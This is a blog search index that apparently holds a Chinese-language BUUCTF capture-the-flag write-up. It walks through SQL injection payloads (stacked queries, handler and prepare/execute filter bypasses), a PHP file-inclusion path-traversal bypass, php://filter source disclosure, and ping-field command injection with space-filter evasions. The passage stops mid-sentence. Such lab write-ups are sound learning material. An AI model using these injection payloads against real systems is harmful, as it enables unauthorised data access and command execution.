<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HELLO</title>
    <link href="/2023/03/10/HELLO/"/>
    <url>/2023/03/10/HELLO/</url>
    
    <content type="html"><![CDATA[<h1 id="Just-a-test"><a href="#Just-a-test" class="headerlink" title="Just a test:)"></a>Just a test:)</h1><h2 id="My-first-blog"><a href="#My-first-blog" class="headerlink" title="My first blog"></a>My first blog</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">terces</span><span class="hljs-operator">=</span>d712373303471becd6f647f54703e6f5d696b7f6471647f607<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2023/03/09/BUUCTF/"/>
    <url>/2023/03/09/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-Writeup"><a href="#BUUCTF-Writeup" class="headerlink" title="BUUCTF  Writeup"></a><em>BUUCTF  Writeup</em></h1><h2 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/03/09/BUUCTF/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h2><p>嗯。。一打开是一个滑稽脸直接一眼ctrl+u查看源代码，查找到注释提示source.php，进入source.php看到是php代码审计。</p><p><img src="/2023/03/09/BUUCTF/image-20230213015433704.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看代码主体部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>   ) &#123;<br>       <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>       <span class="hljs-keyword">exit</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>   &#125;  <br></code></pre></td></tr></table></figure><p>明确了传入一个参数file，并且如果满足：</p><p>file不为空（被赋值）；是字符串；传入emmm类中的checkFile()方法后返回值为真。则能够将file包含。</p><p>审计emmm类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>白名单中包含”source.php”和”hint.php”，source.php就是本页面，传入file&#x3D;hint.php对hint.php进行包含（一开始做的时候真的以为是什么提示硬是想不看提示自己琢磨结果发现无论如何还是得看的呜呜呜呜呜）</p><p><img src="/2023/03/09/BUUCTF/image-20230213021555716.png"></p><p>告诉了我们得到flag不是在这，而是在ffffllllaaaagggg，继续审计，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page必须是有被赋值而且是字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page如果在白名单内（source.php和hint.php）则返回true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br></code></pre></td></tr></table></figure><p>mb_substr(a,b,c)，对a字符串进行截取，从第b位开始，截取c个字符串长度，返回截取的字符串；</p><p>mb_strpos(a,b)，返回字符串b在字符串a中<em><strong>第一次</strong></em>出现的位置，如果没出现过则返回false；</p><p>mb_substr()截取$page，从第一个字符开始，截取长度为mb_strpos($page.’?’,’?’)，即问号在字符串page$.’?’（就是$page字符串最后面跟一个问号）中<em><strong>第一次</strong></em>出现的位置，记住是第一次，$page.’?’末尾的问号未必是第一次出现的位置。截取到的字符串赋值给$_page。（注意分清变量名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果$_page在白名单里，则返回true，$_page的值我们是可以决定的，所以传入的file的值应以字符串”hint.php?”或者”source.php?”开头，这样一来经过mb_sudstr()的截取最终将”hint.php”或”source.php”与白名单进行对比返回为true。</p><p>到此为止已经满足了主体部分的三个条件了，结合hint.php的提示flag在ffffllllaaaagggg，传参?file&#x3D;hint.php?ffffllllaaaagggg，没有结果判断flag不在本目录，盲猜在根目录，于是</p><p>payload：</p><p>?file&#x3D;hint.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg  或  ?file&#x3D;source?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><p><img src="/2023/03/09/BUUCTF/image-20230213024856357.png"></p><hr><h2 id="新生赛include1"><a href="#新生赛include1" class="headerlink" title="新生赛include1"></a><strong>新生赛include1</strong></h2><p>一开始只有一个tips超链接，点击，提示“Can you find out the flag?”。查看源代码没有任何收获，发现url的位置是通过file传参，file&#x3D;flag.php。想到应该是主页源码含有文件包含，通过包含参数file。尝试php伪协议。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=php://input<br></code></pre></td></tr></table></figure><p>页面发出警告“hacker!”尝试大写绕过失败，尝试filter伪协议读取网页源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213113603645.png"></p><p>base64解码后拿到flag</p><p><img src="/2023/03/09/BUUCTF/image-20230213113736893.png"></p><p>题后反思：用同样的方法查看了一下index.php源码</p><p><img src="/2023/03/09/BUUCTF/image-20230213114000858.png"></p><p>过滤函数使用的是stristr()是不区分大小写的，strstr()则区分，同样还过滤掉了zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;还有data:&#x2F;&#x2F;。顺路学了下文件上传的zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;协议注入。</p><hr><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/03/09/BUUCTF/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/03/09/BUUCTF/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/03/09/BUUCTF/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/03/09/BUUCTF/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/03/09/BUUCTF/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/03/09/BUUCTF/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h2><p>做这道题时想到前面做过的另外一题（新生赛exec）。总结了以下联合执行的符号作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">p1;p2:<span class="hljs-string">&quot;先执行p1后执行p2;</span><br><span class="hljs-string">p1|p2:p1的输出作为p2的输入，只显示p2的结果；</span><br><span class="hljs-string">p1||p2:若p1为假则执行p2，为真停止执行；</span><br><span class="hljs-string">p1&amp;&amp;p2:若p1为真则执行p2，为假停止执行；</span><br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=| ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021610128.png"></p><p>说实话一开始没反应过来space是空格的意思就没想着空格被过滤了（，单纯以为是表达错误不需要空格然后把空格删掉发现可以执行,直到下面cat命令没法正常执行时才反应过来是空格被ban了（。</p><p>提示空格被ban了，传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|ls<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=;ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021933333.png"></p><p>回显提示目录里有flag.php和index.php</p><p>直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|cat flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214022139800.png"></p><p>然后提示空格被ban了。参考了大佬们的博客，大佬总结了以下几点绕过空格的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;IFS&#125;$<span class="hljs-number">9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br>$&#123;IFS&#125;<br>$IFS$<span class="hljs-number">1</span> <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=$<span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br><span class="hljs-comment">#来自大佬博客：https://blog.csdn.net/vanarrow/article/details/108295481</span><br><br></code></pre></td></tr></table></figure><p>逐一试下来发现$IFS$1是可行的但是提示flag被ban了（悲）</p><p><img src="/2023/03/09/BUUCTF/image-20230214023158094.png"></p><p>既然看不了flag又不知道过滤规则，反正还有个index.php能看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=|<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1index</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214023326732.png"></p><p>密密麻麻的这么多都被过滤了，括号引号星号全员过滤。。。想起之前从学长那里学来的星号绕过，也不能用了，没有头绪的时候。</p><p>正巧刚刚在学习绕过空格过滤的时候看到一篇博客，<a 